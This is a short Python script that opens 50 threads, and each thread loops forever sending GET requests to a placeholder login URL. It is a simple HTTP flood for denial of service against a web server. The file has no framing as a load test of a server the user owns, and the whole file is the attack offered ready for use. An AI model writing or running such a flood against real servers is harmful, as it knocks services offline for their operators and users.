import requests
import threading

# Target URL
target_url = "http://your-target-server-address/login"

# Function to send requests
def send_requests():
    while True:
        try:
            # Send a GET request
            response = requests.get(target_url)
            print(f"Request sent successfully, status code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            # Print error message
            print(f"Request failed: {e}")

# List of threads
threads = []

# Create and start 50 threads
for i in range(50):
    t = threading.Thread(target=send_requests)
    t.start()
    threads.append(t)

# Wait for all threads to complete
for thread in threads:
    thread.join()
